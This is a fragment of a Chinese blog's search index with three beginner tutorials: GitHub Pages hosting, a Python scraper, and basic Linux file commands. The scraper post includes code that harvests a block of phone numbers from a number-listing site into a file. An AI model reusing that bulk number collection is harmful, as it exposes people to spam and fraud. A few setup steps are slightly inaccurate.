Rails、jQuery、Ruby、Erlang/OTP；近三年流行的开源库往往在GitHub首发，例如：BootStrap、Node.js、CoffeScript等。 alexa全球排名414的网站。 也就是说，你想把你写好的开源程序发布出去，Github将是最佳选择。 ","date":"2019-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:2:0","tags":["笔记","HTML","Github Pages","Website","建站"],"title":"如何使用 GitHub 搭建网站","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"本期的主要内容 本期内容将会写出如何使用Github搭建一个简单的网站 ","date":"2019-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:3:0","tags":["笔记","HTML","Github Pages","Website","建站"],"title":"如何使用 GitHub 搭建网站","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"使用Github建站的好处 安全 由于你的网页源代码是由Github托管，所以Github有多安全，你的网站就有多安全，别人想黑你就得先黑掉Github 简单 大部分操作只需要有前端基础就可以轻松完成 无忧 后端用Github的服务器，无需一天24小时维护，可以做到无人值守 ","date":"2019-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:3:1","tags":["笔记","HTML","Github Pages","Website","建站"],"title":"如何使用 GitHub 搭建网站","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"使用Github建站的缺点 限制 Github仓库只能运行基于HTML这类的静态网页，不能使用数据库等花里胡哨的东西。 禁止爬虫 Github的仓库是禁止搜索引擎进行爬取内容的，所以你搭建的网站不会在搜索引擎上被找到。 (事实证明其实可以) 以上就是使用Github建站的优缺点，在搭建之前必须按实际情况以及需求来考虑。 ","date":"2019-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:3:2","tags":["笔记","HTML","Github Pages","Website","建站"],"title":"如何使用 GitHub 搭建网站","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"详细教程 ","date":"2019-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:4:0","tags":["笔记","HTML","Github Pages","Website","建站"],"title":"如何使用 GitHub 搭建网站","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"准备 注册帐号 首先你需要去Github注册一个帐号，只需要使用邮箱就可以注册，具体方法就不多说了，绝大多数人都会。 萌新:大佬，我看不懂英文啊。。 大佬:emmmm 谷歌翻译，请 创建仓库 当你登录帐号以后，你可以看到左上角一个绿绿的new，点击它 然后，就会弹出一个要你填的东西 如图所示，Respository name就是仓库的名称， 注意:Github只允许使用与用户名相同的仓库名搭建网页 这里有个特殊格式: 你的GitHub用户名.github.io 这个仓库名以后就是你的网址了 创建完以后就是个空的仓库 这个时候你就可以按照它的提示上传你的网页代码了。 ","date":"2019-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:4:1","tags":["笔记","HTML","Github Pages","Website","建站"],"title":"如何使用 GitHub 搭建网站","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"上传代码 这里我会贴出一部分 git 的用法 首先创建一个目录: $ mkdir ./你的Github用户名 这个目录的名称其实可以随便写，但是为了方便管理，还是写成你的Github用户名比较好。 接下来进入这个目录: $ cd ./你的Github用户名 执行: $ git init 这个命令会使你这个目录被初始化为git目录，如果不理解的话去学一下git吧。。。。 接下来你就可以开始创建、编写你的网页代码了，比如我写个简单的HTML 先创建一个index.html文件 $ vim ./index.html 这里使用了vim，它会使你的终端自动进入编辑页面。 接下来按 i 键进入编辑模式 在里面写入以下代码 \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eHelloWorld\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003eHelloWorld\u003c/h1\u003e \u003cp\u003eHelloWorld,this is my first website.\u003c/p\u003e \u003c/body\u003e \u003c/html\u003e 你可以使用HTML语言随意编写你的网站，可以添加多个html页面文件和CSS，甚至JavaScript。 编写完你的代码后，按 ESC 键回到命令模式，接下来按 : 键，你的vim左下角就会出现一个冒号，接下来 :wq 接下来…执行 $ git add index.html 然后你的创建的网页代码文件将会被提交 如果你的文件比较多的话，可以试试 $ git add * 这样你就可以快速的提交你所有的文件了 然后依次执行以下命令进行提交 $ git commit -m \"first commit\" $ git remote add origin https://github.com/你的Github用户名/你的Github用户名.github.io.git $ git push -u origin master 接下来输入你的Github帐号和密码就可以提交了。 然后你就可以在浏览器里访问你的网站了。 地址就是上面所述的: 你的Github用户名.github.io 效果图: ","date":"2019-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:4:2","tags":["笔记","HTML","Github Pages","Website","建站"],"title":"如何使用 GitHub 搭建网站","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"结语 以上就是使用github搭建简单网页的全过程了，由于时间关系所以只能写这么多了，下期可能又会拖一段时间。 ","date":"2019-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:5:0","tags":["笔记","HTML","Github Pages","Website","建站"],"title":"如何使用 GitHub 搭建网站","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["Web"],"content":"参考链接 git教程 Archwiki|vim Archwiki|git html教程 ","date":"2019-10-13","objectID":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/:6:0","tags":["笔记","HTML","Github Pages","Website","建站"],"title":"如何使用 GitHub 搭建网站","uri":"/zh-cn/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/"},{"categories":["编程"],"content":"虽然被爬的那个网站已经GG了...","date":"2019-08-13","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/","tags":["笔记","Linux","Python","编程","爬虫"],"title":"Python学习笔记 简单爬虫","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["编程"],"content":"一如既往不正经的前言 嘿嘿，我又回来了，今天在U盘里弄好了hexo，现在可以继续更新了 并且这次博客添加了访问量统计，欢迎扩～ 那么，本期更新一个简单的Python爬虫 ","date":"2019-08-13","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:1:0","tags":["笔记","Linux","Python","编程","爬虫"],"title":"Python学习笔记 简单爬虫","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["编程"],"content":"爬虫原理 小白: 大佬大佬～爬虫是啥啊？ 大佬: 去搜索引擎查呀 小白: 查了，还是看不懂 大佬: emmmmm..那你继续往下看吧… ","date":"2019-08-13","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:2:0","tags":["笔记","Linux","Python","编程","爬虫"],"title":"Python学习笔记 简单爬虫","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["编程"],"content":"概述 2333,爬虫其实很好理解 我们都知道上网是用浏览器的，那么我们具体是怎样访问一个网页的呢？看下面吧(懒得画图了) 浏览器 –发送一个请求www.bing.com –\u003e 服务器 \u003c–接受到请求-– 服务器 –做出响应–\u003e –返回数据–\u003e 浏览器 什么？还是不了解？那我们用浏览器来看一下吧，我们随便打开一个网页 以Chrome/Chromiun为例，接下来依次点击 鼠标右键——检查——NetWork——将Preserve log打上勾 ，然后刷新 就会发现出现了以下内容 我们可以看到浏览器很详细的把请求内容显示出来了，而左边那些列表，你已经获取了这个网站的内容。 爬虫的原理就是把这些过程自动化，不需要我们去手动访问，就可以把网页中你想要的信息和内容爬取下来。 ","date":"2019-08-13","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:2:1","tags":["笔记","Linux","Python","编程","爬虫"],"title":"Python学习笔记 简单爬虫","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["编程"],"content":"爬虫的作用 举个例子，这里有一个 全国号码段(链接已失效) 的网站，我们需要取一个城市中其中一个号码段的所有的号码。比如西安市 可以看到，号码段有很多，每个段有一万个号码。这个时候怎么办呢？总不可能用鼠标一条一条的去复制粘贴吧？这个时候爬虫就派上用场了。 其实也可以用来爬取我的博客，当更新的时候就可以及时收到更新信息 啊啊别打我，疼疼疼 ","date":"2019-08-13","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:2:2","tags":["笔记","Linux","Python","编程","爬虫"],"title":"Python学习笔记 简单爬虫","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["编程"],"content":"编程语言的选择 我们如果要进行爬虫工作，那么就必须使用编程语言，用得最多的是Python，因为Python进行爬虫是比较简便的，当然也可以选择其他的比如C/C++、Java等，甚至是易语言都可以做到，只不过难易度和写法不同，目的和功能都是一样的。本期我们选择Python ","date":"2019-08-13","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:3:0","tags":["笔记","Linux","Python","编程","爬虫"],"title":"Python学习笔记 简单爬虫","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["编程"],"content":"Python的安装 Python是跨平台的语言，所以平台不同安装方法也有所不同。 ","date":"2019-08-13","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:4:0","tags":["笔记","Linux","Python","编程","爬虫"],"title":"Python学习笔记 简单爬虫","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["编程"],"content":"Windows 可以到Python的官网去下载安装程序并安装，建议下载Python3 ","date":"2019-08-13","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:4:1","tags":["笔记","Linux","Python","编程","爬虫"],"title":"Python学习笔记 简单爬虫","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["编程"],"content":"Mac OSX 同样到Python的官网下载 ","date":"2019-08-13","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:4:2","tags":["笔记","Linux","Python","编程","爬虫"],"title":"Python学习笔记 简单爬虫","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["编程"],"content":"Linux Linux则在包管理器安装即可 deb系 $ sudo apt-get install python3 Arch系 $ sudo pacman -S python rpm系 $ sudo yum install python3 ","date":"2019-08-13","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:4:3","tags":["笔记","Linux","Python","编程","爬虫"],"title":"Python学习笔记 简单爬虫","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["编程"],"content":"Android Android平台则安装QPython即可， 到酷安安装 QPython官网 ","date":"2019-08-13","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:4:4","tags":["笔记","Linux","Python","编程","爬虫"],"title":"Python学习笔记 简单爬虫","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["编程"],"content":"安装pip Windows和Mac OSX的安装程序会自动装上pip，而Linux则不会，需要手动安装。 什么？你问我Android？我也不知道2333 首先打开这个网页，然后点击Download，下载第二个tar.gz文件，这是个Linux压缩文件。 然后解压它，就会得到一个pip-19.2.2目录 $ tar -xvf pip-19.2.2.tar.gz cd进去 $ cd ./pip-19.2.2 下面有一个 setup.py 文件，用python执行它即可 $ sudo python setup.py 之后就会自动安装好pip了。 ","date":"2019-08-13","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:5:0","tags":["笔记","Linux","Python","编程","爬虫"],"title":"Python学习笔记 简单爬虫","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["编程"],"content":"需要安装的模块 我的爬虫用到了以下模块： requests，网页请求模块 BeautifulSoup，分析模块 安装命令： $ sudo pip install requests BeautifulSoup 如果感觉到速度很慢，则参考这里更换国内镜像源。 ","date":"2019-08-13","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:6:0","tags":["笔记","Linux","Python","编程","爬虫"],"title":"Python学习笔记 简单爬虫","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["编程"],"content":"代码公开 这里公开一下获取手机号的简单爬虫代码 from bs4 import BeautifulSoup import requests print(\"简易手机号码抓取工具 By WeepingDogel\") url=\"http://www.hiphop8.com/mobile/xian_1319339.html\" page=requests.get(url) page_info=page.content soup = BeautifulSoup(page_info, \"html.parser\") numbers = soup.find_all('a') with open(\"1319339.txt\",\"w\") as file: for number in numbers: print(number.string) file.write(str(number.string)+\"\\n\") 将代码复制到一个py文件中运行或修改即可。 ","date":"2019-08-13","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:7:0","tags":["笔记","Linux","Python","编程","爬虫"],"title":"Python学习笔记 简单爬虫","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["编程"],"content":"最后 写得比较仓促，所以可能不够详细，请谅解。下方有评论区，欢迎评论(Tu Cao)。 ","date":"2019-08-13","objectID":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/:8:0","tags":["笔记","Linux","Python","编程","爬虫"],"title":"Python学习笔记 简单爬虫","uri":"/zh-cn/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/"},{"categories":["Linux"],"content":"Linux的基本命令用法","date":"2019-08-05","objectID":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/","tags":["Linux","教程","新手","入门"],"title":"Linux 基础命令","uri":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["Linux"],"content":"提示：面向萌新，大佬勿喷 刚入门Linux难免会觉得很麻烦，因为不知道如何使用命令去操作，这样的话在Linux系统是寸步难行的，但是学会了一些基础命令以后就能无压力的操作了，想不想学会Linux？那就让我们从简单的文件操作开始吧。 ","date":"2019-08-05","objectID":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/:0:0","tags":["Linux","教程","新手","入门"],"title":"Linux 基础命令","uri":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["Linux"],"content":"如何使用命令行 如果你的发行版自带图形界面的话，可以从图形界面的菜单中找到一个叫 “终端” 的东西，打开它，就可以使用命令了。如果你的发行版不带图形界面，那么在tty登录用户以后就可以直接使用了。 注意，这个终端不等于DOS也不等于cmd，它和windows是没有办毛钱关系的，是另一种东西。 ","date":"2019-08-05","objectID":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/:1:0","tags":["Linux","教程","新手","入门"],"title":"Linux 基础命令","uri":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["Linux"],"content":"cd命令 如果你之前用过DOS或者经常使用windows的cmd，你就会知道这个命令了，这个命令在大多数操作系统中都有。 cd命令是”change directory”的缩写，也就是改变你当前所在的目录，后面可以加相对路径，也可以加上绝对路径。 简单的理解，就是进入一个文件夹。 ","date":"2019-08-05","objectID":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/:2:0","tags":["Linux","教程","新手","入门"],"title":"Linux 基础命令","uri":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["Linux"],"content":"用法 测试目录:/a/b/c 进入某个目录: 绝对路径：指定一个完整的路径，与自己当前所在的目录无关 [weepingdogel@localhost ~]$ cd /a/b/c # 进入/a/b/c这个路径中的目录c # 按下回车后 [weepingdogel@localhost c]$ 相对路径：指定当前目录上级目录下的其他目录或下级中的一个目录 指定下一级(常用) [weepingdogel@localhost b]$ cd ./c # 进入当前所在/a/b目录下面的目录c # 按下回车后 [weepingdogel@localhost c]$ 指定上一级 [weepingdogel@localhost b]$ cd ../xxx #进入当前所在目录/a/b中的/a目录下的其他目录 # 按下回车后 [weepingdogel@localhost xxx]$ 退出某个目录: 有人可能不知道，进入了目录以后怎么退出来，那么这个时候就要用到cd ..命令了。 返回上一级 [weepingdogel@localhost c]$ cd .. # 从当前所在的目录/a/b/c返回上一级的目录/a/b # 按下回车后 [weepingdogel@localhost b]$ 返回上两级 [weepingdogel@localhost c]$ cd ../.. # 从当前所在的目录/a/b/c返回上两级的目录/a # 按下回车后 [weepingdogel@localhost a]$ ","date":"2019-08-05","objectID":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/:2:1","tags":["Linux","教程","新手","入门"],"title":"Linux 基础命令","uri":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["Linux"],"content":"pwd命令 这个命令是用来辅助上面的cd命令的，它的作用是查看当前所在的绝对路径。 ","date":"2019-08-05","objectID":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/:3:0","tags":["Linux","教程","新手","入门"],"title":"Linux 基础命令","uri":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["Linux"],"content":"用法 [weepingdogel@localhost ~]$ pwd # 按下回车后 /home/weepingdogel 假如当前所在目录为/a/b/c [weepingdogel@localhost c]$ pwd # 按下回车后 /a/b/c 虽然只有一个作用，但是却很重要，因为新手每天都会用到，bash或者部分zsh主题是不会显示绝对路就的，如果你不知道你当前在操作哪个目录，你就得用上pwd这个命令了。 ","date":"2019-08-05","objectID":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/:3:1","tags":["Linux","教程","新手","入门"],"title":"Linux 基础命令","uri":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["Linux"],"content":"ls命令 这个命令相当于windows中的dir，作用是显示当前目录下的所有的文件和目录。 ","date":"2019-08-05","objectID":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/:4:0","tags":["Linux","教程","新手","入门"],"title":"Linux 基础命令","uri":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["Linux"],"content":"用法 测试目录/tmp/a/b/c 直接查看 [weepingdogel@localhost c]$ ls # 查看当前目录下面的文件 # 按下回车后 223333 文本.txt test wiaori # 被列出的文件 [weepingdogel@localhost c]$ 列表式查看，参数-l [weepingdogel@localhost c]$ ls -l #按下回车后 总用量 4 -rw-r--r-- 1 weepingdogel weepingdogel 0 8月 5 17:52 223333 -rw-r--r-- 1 weepingdogel weepingdogel 11 8月 5 17:38 文本.txt drwxr-xr-x 2 weepingdogel weepingdogel 40 8月 5 17:52 test -rw-r--r-- 1 weepingdogel weepingdogel 0 8月 5 17:52 wiaori [weepingdogel@localhost c]$ 易读列表查看，参数-lh [weepingdogel@localhost c]$ ls -lh # 按下回车后 总用量 4.0K -rw-r--r-- 1 weepingdogel weepingdogel 0 8月 5 17:52 223333 -rw-r--r-- 1 weepingdogel weepingdogel 11 8月 5 17:38 文本.txt drwxr-xr-x 2 weepingdogel weepingdogel 40 8月 5 17:52 test -rw-r--r-- 1 weepingdogel weepingdogel 0 8月 5 17:52 wiaori [weepingdogel@localhost c]$ 按时间排序的易读列表查看，参数-lh –sort=time [weepingdogel@localhost c]$ ls -lh --sort=time # 按下回车后 总用量 4.0K drwxr-xr-x 2 weepingdogel weepingdogel 40 8月 5 17:52 test -rw-r--r-- 1 weepingdogel weepingdogel 0 8月 5 17:52 wiaori -rw-r--r-- 1 weepingdogel weepingdogel 0 8月 5 17:52 223333 -rw-r--r-- 1 weepingdogel weepingdogel 11 8月 5 17:38 文本.txt [weepingdogel@localhost c]$ 按文件大小排序的易读列表查看，参数-lh –sort=size [weepingdogel@localhost c]$ ls -lh --sort=size # 按下回车后 总用量 4.0K drwxr-xr-x 2 weepingdogel weepingdogel 40 8月 5 17:52 test -rw-r--r-- 1 weepingdogel weepingdogel 11 8月 5 17:38 文本.txt -rw-r--r-- 1 weepingdogel weepingdogel 0 8月 5 17:52 223333 -rw-r--r-- 1 weepingdogel weepingdogel 0 8月 5 17:52 wiaori [weepingdogel@localhost c]$ 更多用法等你自己去摸索了 ","date":"2019-08-05","objectID":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/:4:1","tags":["Linux","教程","新手","入门"],"title":"Linux 基础命令","uri":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["Linux"],"content":"文件复制与移动 ","date":"2019-08-05","objectID":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/:5:0","tags":["Linux","教程","新手","入门"],"title":"Linux 基础命令","uri":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["Linux"],"content":"mv命令 这个命令是英文单词move的缩写。 它的作用主要是移动某些文件到指定的位置，你可以指定绝对路径，但是如果离得比较近的话就可以使用相对路径。 用法 绝对路径用法： 比如我们把 “目录c” 下面的 “文本.txt” 移动到/tmp/a/下面 [weepingdogel@localhost c]$ mv /tmp/a/b/c/文本.txt /tmp/a/ # 按下回车后，文件就被移动了 [weepingdogel@localhost c]$ 接下来我们切换到/tmp/a/下面看看吧 [weepingdogel@localhost c]$ cd /tmp/a [weepingdogel@localhost a]$ ls 文本.txt b [weepingdogel@localhost a]$ 此时我们就看到了那个 “文本.txt” 被移动到了/tmp/a/下面了。 相对路径用法： 那么我们用另一种方法把这个文件移回去吧，首先我们还在这个/tmp/a/下面，那么命令如下 [weepingdogel@localhost a]$ mv ./文本.txt ./b/c/ # 按下回车后，文件就被移动了 [weepingdogel@localhost a]$ 接下来我们回到/tmp/a/b/c/下面看看吧。 [weepingdogel@localhost a]$ cd ./b/c [weepingdogel@localhost c]$ ls 223333 文本.txt test wiaori [weepingdogel@localhost c]$ 看到了没有，它又回来了。 ","date":"2019-08-05","objectID":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/:5:1","tags":["Linux","教程","新手","入门"],"title":"Linux 基础命令","uri":"/zh-cn/posts/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"},{"categories":["Linux"],"content":"cp命令 哈哈，这个命令也不是那个cp的意思，它是 “copy” 的缩写，复制的意思。 顾名思义，它的作用就是把一个文件复制到另一个地方。它同样有指定绝对路径和相对路径的两种用法。来尝试一下？ 用法 绝对路径： 我们来试试把/tmp/a/b/c/文本.txt这个文件复制到/tmp/a/下面 [weepingdogel@localhost c]$ cp /tmp/a/b/c/文本.txt /tmp/a/ # 按下回车后，文件就被复制了 [weepingdogel@localhost c]$ cd ../.. # 我们来看看它是否被复制成功 [weepingdogel@localhost a]$ ls -lh # 使用ls命令看一下，可见他是被复制成功的，创建日期与上面不一样。 总用量 4.0K -rw-r--r-- 1 weepingdogel weepingdogel 11 8月 5 18:36 文本.txt drwxr-xr-x 3 weepingdogel weepingdogel 60 8月 5 17:37 b [weepingdogel@localhost a]$ 注意：此命令如果不使用高级用法是无法复制创建时间和所有者的 相对路径： 嘿嘿，我们尝试给/tmp/a/的每一级目录都复制一份吧。 [weepingdogel@localhost a]$ cp ./文本.txt ./b/ # 先复制到目录b [weepingdogel@localhost a]$ cp ./文本.txt ./b/c/ # 复制到目录c [weepingdogel@localhost a]$ cp ./文本.txt ../ # 复制到/tmp/下面 [weepingdogel@localhost a]$ cd .. # 回到/tmp下面 [weepingdogel@localhost tmp]$ ls -lh # 查看是否复制成功，可见第一个就是该文件 总用量 4.0K -rw-r--r-- 1 weepingdogel weepingdogel 11 8月 5 18:48 文本.txt drwxr-xr-x 3 weepingdogel weepingdogel 80 8月 5 18:36 a # 接下来一级一级往下看 [weepingdogel@localhost tmp]$ ls -lh ./a 总用量 4.0K -rw-r--r-- 1 weepingdogel weepingdogel 11 8月 5 18:36 文本.txt drwxr-xr-x 3 weepingdogel weepingdogel 80 8月 5 18:45 b [weepingdogel@localhost tmp]$ ls -lh ./a/b -rw-r--r-- 1 weepingdogel weepingdogel 11 8月 5 18:45 文本.txt drwxr-xr-x 3 weepingdogel weepingdogel 120 8月 5 18:25 c [weepingdogel@localhost tmp]$ ls -lh ./a/b/c 总用量 4.0K -rw-r--r-- 1 weepingdogel weepingdogel 0 8月 5 17:52 223333 -rw-r--r-- 1 weepingdogel weepingdogel 11 8月 5 18:47 文本.txt drwxr-xr-x 2 weepingdogel weepingdogel 40 8月 5 17:52 test -rw-r--r-- 1 weepingdogel weepingdogel 0 8月 5 17:52 wiaori 可见，复制是成功的。 注意：如果要复制目录，请在指定目录前加上参数-r，否则将无法复制 